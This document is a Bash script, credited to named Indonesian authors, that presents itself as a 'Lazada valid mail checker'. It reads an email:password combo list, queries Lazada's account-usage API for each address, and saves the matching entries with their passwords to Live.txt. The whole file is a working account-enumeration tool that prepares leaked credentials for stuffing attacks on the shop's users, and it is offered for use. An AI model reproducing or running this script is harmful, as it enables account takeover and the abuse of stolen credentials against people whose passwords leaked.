#!/bin/bash
#issued on : 17 agustus 2018
#coded By Arvan Apriyana
#re-coded By Dito Firmansyach
# w recode iyh by https://www.facebook.com/dito13.onion
waktu=$(date '+%Y-%m-%d %H:%M:%S')
HIJAU='\033[0;32m'
MERAH='\033[0;31m'
NORMAL='\033[0m'
CYAN='\033[0;36m'
NC='\033[0m'
PUTIH='\033[1;37m'
LB='\033[0;94m'
header(){
printf "${LB}
███████╗██╗██████╗ ███████╗███╗   ███╗ █████╗ ██╗      █████╗ ███████╗
██╔════╝██║██╔══██╗██╔════╝████╗ ████║██╔══██╗██║     ██╔══██╗██╔════╝
███████╗██║██████╔╝█████╗  ██╔████╔██║███████║██║     ███████║███████╗
╚════██║██║██╔═══╝ ██╔══╝  ██║╚██╔╝██║██╔══██║██║     ██╔══██║╚════██║
███████║██║██║     ███████╗██║ ╚═╝ ██║██║  ██║███████╗██║  ██║███████║
╚══════╝╚═╝╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ 
${PUTIH} ------------------------------------
     LAZADA VALID MAIL CHECKER
 ------------------------------------
        emaillo:passwordlo
"
}
scanskrng(){
    kocak="$1"
    cek=$(curl -s "https://member.lazada.co.id/user/api/checkEmailUsage?email=$1" -L | grep -Po '(?<="result":)[^,]*}' | tr -d '[]"}') #apinya
if [[ "$cek" = "NONE" ]]; then
        printf "[$i]${MERAH}[Die] => $1 $2\n${NC}"
       
    else
        printf "[$i]${HIJAU}[LIVE] => $1 $2 [$cek]  ${NC}\n"

          echo "$1 | $2 | [$cek] " >> Live.txt

        
fi

}
header
printf "${PUTIH}══════════════════════════════════════════════════════════════════════${NC}\n\n"
#Select mailist from


ls *.txt
printf "${PUTIH}══════════════════════════════════════════════════════════════════════${NC}\n\n"
echo -n " Put Your List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emaillo=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordlo=($y)'
    for (( i = 0; i < "${#emaillo[@]}"; i++ )); do
    em="${emaillo[$i]}"
    pw="${passwordlo[$i]}"
        scanskrng $em $pw
done
